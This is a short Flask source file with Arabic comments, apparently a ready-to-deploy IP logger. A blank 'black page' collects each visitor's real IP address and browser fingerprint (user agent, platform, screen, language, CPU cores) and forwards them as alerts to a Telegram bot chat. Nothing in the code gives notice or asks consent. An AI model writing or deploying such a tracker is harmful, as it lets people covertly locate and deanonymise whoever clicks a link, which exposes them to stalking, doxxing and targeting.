import os
import requests
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

# ⚠️ ضع التوكن و Chat ID هنا أو استخدم متغيرات البيئة في Render
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', 'ضع_التوكن_هنا')
CHAT_ID = os.environ.get('CHAT_ID', 'ضع_الايدي_هنا')

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

@app.route('/')
def index():
    # عرض الصفحة السوداء
    return render_template('index.html')

@app.route('/collect', methods=['POST'])
def collect():
    # جلب الـ IP الحقيقي (مهم جداً لأن Render يستخدم Proxy)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # قد يحتوي X-Forwarded-For على عدة IPs، نأخذ الأول
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    # استقبال البيانات من الـ JavaScript
    data = request.get_json() or {}
    user_agent = data.get('userAgent', 'غير معروف')
    platform = data.get('platform', 'غير معروف')
    screen = data.get('screen', 'غير معروف')
    language = data.get('language', 'غير معروف')
    hardware = data.get('hardwareConcurrency', 'غير معروف')

    # صياغة الرسالة
    message = (
        f"🚨 <b>زيارة جديدة</b>\n"
        f"—————————————\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"📱 <b>المنصة:</b> {platform}\n"
        f"📐 <b>الشاشة:</b> {screen}\n"
        f"🗣 <b>اللغة:</b> {language}\n"
        f"⚙️ <b>أنوية المعالج:</b> {hardware}\n"
        f"🖥 <b>User-Agent:</b>\n<code>{user_agent}</code>"
    )

    send_to_telegram(message)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
